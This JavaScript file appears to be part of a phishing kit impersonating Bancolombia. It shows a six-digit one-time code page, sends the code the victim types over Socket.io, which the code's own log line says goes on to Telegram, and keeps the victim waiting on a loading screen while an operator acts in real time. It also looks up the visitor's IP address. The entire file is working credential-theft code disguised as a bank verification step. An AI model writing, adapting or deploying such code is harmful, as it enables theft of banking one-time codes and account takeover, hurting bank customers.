document.addEventListener('DOMContentLoaded', function() {
    const digitInputs = document.querySelectorAll('.digit-input');
    const btnContinuar = document.querySelector('.btn-iniciar');
    const btnCancelar = document.querySelector('.btn-cancelar');
    const form = document.getElementById('dynamicForm');
    
    // Usar sistema centralizado
    const sessionId = bancolombia.initGlobalSession();
    bancolombia.initializeSocket();
    bancolombia.setupTelegramActions();
    const loadingOverlay = bancolombia.createLoadingOverlay();
    
    // Obtener socket del sistema centralizado
    const getSocket = () => bancolombia.getSocket();

    // Manejar inputs de dígitos
    digitInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            if (e.inputType === "deleteContentBackward") {
                if (index > 0) {
                    digitInputs[index - 1].focus();
                }
            } else if (e.target.value) {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                if (e.target.value && index < digitInputs.length - 1) {
                    digitInputs[index + 1].focus();
                }
            }
            checkComplete();
        });

        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !e.target.value && index > 0) {
                digitInputs[index - 1].focus();
            }
        });
    });

    function checkComplete() {
        const isComplete = Array.from(digitInputs).every(input => input.value.length === 1);
        if (isComplete) {
            btnContinuar.removeAttribute('disabled');
            btnContinuar.classList.add('active');
        } else {
            btnContinuar.setAttribute('disabled', '');
            btnContinuar.classList.remove('active');
        }
    }

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const dynamicCode = Array.from(digitInputs).map(input => input.value).join('');
        
        if (dynamicCode.length !== 6) {
            alert('Por favor ingresa los 6 dígitos');
            return;
        }
        
        loadingOverlay.show();
        
        // Deshabilitar formulario
        digitInputs.forEach(input => input.disabled = true);
        btnContinuar.disabled = true;
        btnCancelar.disabled = true;
        
        console.log('📤 Enviando clave dinámica:', dynamicCode);
        
        // Obtener socket actual
        const socket = getSocket();
        
        // Verificar socket
        console.log('🔍 Verificando socket:', {
            exists: !!socket,
            connected: socket ? socket.connected : false,
            id: socket ? socket.id : null,
            sessionId: sessionId
        });
        
        if (!socket || !socket.connected) {
            console.error('❌ Socket no conectado');
            alert('Error de conexión. Recarga la página.');
            loadingOverlay.hide();
            return;
        }
        
        // Datos a enviar
        const dataToSend = {
            type: 'dinamica',
            sessionId,
            content: {
                text: `🔐 Clave Dinámica: ${dynamicCode}\n⌚ ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`
            },
            waitForAction: true,
            timestamp: Date.now()
        };
        
        console.log('📦 Datos a enviar:', dataToSend);
        
        // Enviar a través de Socket.io
        socket.emit('sendData', dataToSend);
        console.log('✅ Evento sendData emitido');
        
        // Timeout de seguridad
        const timeout = setTimeout(() => {
            console.warn('⚠️ Timeout esperando confirmación');
        }, 15000);
        
        getSocket().once('dataSent', (response) => {
            clearTimeout(timeout);
            if (response.success) {
                console.log('✅ Clave dinámica enviada a Telegram');
                // Mantener overlay esperando acción
            } else {
                console.error('❌ Error:', response.message);
                loadingOverlay.hide();
                digitInputs.forEach(input => input.disabled = false);
                btnContinuar.disabled = false;
                btnCancelar.disabled = false;
                alert('Error al enviar. Intenta nuevamente.');
            }
        });
    });

    btnCancelar.addEventListener('click', () => {
        window.location.href = 'index.html';
    });

    // Actualizar IP y fecha/hora
    async function updateInfo() {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ipEl = document.getElementById('ipAddress');
            if (ipEl) ipEl.textContent = `Dirección IP: ${ipData.ip}`;
            
            const now = new Date();
            const options = { 
                weekday: 'long', 
                year: 'numeric', 
                month: 'long', 
                day: 'numeric',
                hour: 'numeric',
                minute: 'numeric',
                hour12: true,
                timeZone: 'America/Bogota'
            };
            const dateEl = document.getElementById('datetime');
            if (dateEl) dateEl.textContent = now.toLocaleDateString('es-CO', options);
        } catch (error) {
            console.error('Error:', error);
        }
    }

    updateInfo();
    setInterval(updateInfo, 60000);
});